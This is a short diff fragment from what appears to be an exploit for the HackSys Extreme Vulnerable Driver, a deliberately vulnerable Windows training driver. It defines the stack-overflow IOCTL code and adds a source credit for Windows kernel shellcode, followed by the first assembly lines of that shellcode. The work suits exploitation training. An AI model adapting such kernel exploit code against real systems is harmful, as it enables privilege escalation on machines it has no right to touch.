@@ -4,6 +4,7 @@
 
 #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
 /*
+adapted from: https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/
 push r9
 push r8
 push rax
